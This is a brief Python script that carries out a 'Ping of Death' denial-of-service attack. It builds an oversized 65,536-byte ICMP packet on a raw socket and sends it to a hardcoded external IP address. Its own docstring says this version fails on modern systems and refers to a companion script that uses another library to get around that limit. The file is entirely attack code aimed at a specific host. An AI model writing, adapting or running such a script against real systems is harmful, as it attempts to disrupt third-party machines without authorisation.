#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
Description:
    Ping of Death

    The error [Errno 90] Message too long occurs because the socket library enforces restrictions on the packet size for raw sockets, and modern operating systems include safeguards against sending oversized packets that violate the protocol's rules.
    Check out ping-of-death-1.py that using another library
"""

import socket

class Style:
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    CYAN = '\033[36m'
    RESET = '\033[0m'

style = Style()

def send_pod_attack(target_ip):
    """
    Send oversized ICMP packets to simulate Ping of Death
    """
    try:
        # Create a raw socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

        # Define an oversized packet
        # Exceeds maximum allowable size
        oversized_packet = b"A" * 65536

        # Send the packet to the target
        sock.sendto(oversized_packet, (target_ip, 1))

        print(style.GREEN + f"Ping of Death packet send to {target_ip}" +
              style.RESET)
    except Exception as e:
        print(style.RED + f"[-]ERROR: {e}" + style.RESET)

def main():
    target_ip = "162.210.97.174"
    send_pod_attack(target_ip)

    
if __name__ == "__main__":
    main()

